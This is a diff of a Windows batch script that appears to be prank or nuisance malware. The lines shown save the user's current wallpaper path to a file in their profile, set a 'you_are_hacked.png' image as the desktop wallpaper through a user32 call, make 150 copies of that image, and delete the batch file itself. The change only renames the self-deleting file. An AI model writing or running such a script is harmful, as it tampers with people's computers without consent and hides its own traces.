@@ -14,4 +14,4 @@ set LOCALE=%locale%
 powershell -C "$oldWallpaper = (Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name WallPaper).WallPaper; if($oldWallpaper -and (Test-Path $oldWallpaper)) { $backupFile = Join-Path $env:USERPROFILE 'info.txt'; \"$env:LOCALE`n$oldWallpaper\" | Out-File -Encoding ASCII $backupFile }"
 powershell -C "Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class Wallpaper { [DllImport(\"user32.dll\", SetLastError = true)] public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'; [Wallpaper]::SystemParametersInfo(20,0,'%dest%\you_are_hacked.png',3)"
 powershell -C "for($i=1; $i -le 150; $i++) { Copy-Item -Path '%dest%\you_are_hacked.png' -Destination ('%dest%\You_are_hacked_{0}.png' -f $i) }"
-DEL "%USERPROFILE%\Soft_Slap.bat"
+DEL "%USERPROFILE%\You_are_hacked.bat"
